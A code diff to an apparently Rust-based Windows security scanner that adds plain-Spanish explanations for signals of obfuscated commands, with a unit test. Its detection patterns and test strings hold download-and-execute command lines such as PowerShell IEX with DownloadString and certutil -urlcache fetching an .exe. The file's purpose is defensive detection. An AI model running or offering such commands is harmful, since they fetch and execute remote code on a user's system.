@@ -61,15 +61,40 @@ pub fn obfuscation(command: &str) -> Option<Obfuscated> {
     (!patterns.is_empty()).then(|| Obfuscated { decoded: decode_encoded(command), patterns })
 }
 
+/// Qué significa cada señal, en lenguaje simple.
+pub fn explain(pattern: &str) -> &'static str {
+    match pattern {
+        "-enc" | "-encodedcommand" => "el comando está codificado para que no se lea",
+        "-w hidden" | "-windowstyle hidden" => "se ejecuta con la ventana oculta",
+        "-nop" => "se ejecuta sin cargar la configuración normal",
+        "-executionpolicy bypass" | "-ep bypass" => "se salta las restricciones de seguridad de PowerShell",
+        "iex" | "invoke-expression" => "ejecuta texto como si fuera código",
+        "frombase64string" => "esconde datos codificados",
+        "mshta http" | "regsvr32 /i:http" | "certutil -urlcache" => "baja y ejecuta algo desde internet",
+        _ => "descarga algo desde internet", // downloadstring, downloadfile, net.webclient, invoke-webrequest
+    }
+}
+
 pub fn obfuscation_finding(key: String, what: &str, command: &str, o: &Obfuscated) -> Finding {
     Finding {
         key,
         severity: Severity::Medium,
         title: format!("Comando sospechoso en {what}"),
-        detail: format!("Coincide con: {}\n{}", o.patterns.join(", "), shorten(command, 300)),
+        detail: format!("Qué tiene de raro: {}.\n{}", dedup_explanations(&o.patterns), shorten(command, 300)),
         decoded: o.decoded.clone(),
         fix: None,
     }
+}
+
+fn dedup_explanations(patterns: &[&str]) -> String {
+    let mut out: Vec<&str> = vec![];
+    for p in patterns {
+        let e = explain(p);
+        if !out.contains(&e) {
+            out.push(e);
+        }
+    }
+    out.join("; ")
 }
 
 pub fn shorten(s: &str, n: usize) -> String {
@@ -335,6 +360,14 @@ mod tests {
         assert!(obfuscation("IEX (New-Object Net.WebClient).DownloadString('http://x')").is_some());
         assert!(obfuscation("certutil -urlcache -f http://x/a.exe a.exe").is_some());
         assert!(obfuscation("notepad.exe").is_none());
+    }
+
+    #[test]
+    fn explains_each_signal_in_plain_words() {
+        let o = obfuscation("powershell -nop -w hidden -enc AAAA").unwrap();
+        let f = obfuscation_finding("k".into(), "x", "powershell -nop -w hidden -enc AAAA", &o);
+        assert!(f.detail.contains("codificado") && f.detail.contains("ventana oculta"), "{}", f.detail);
+        assert!(!f.detail.contains("Coincide con"));
     }
 
     #[test]
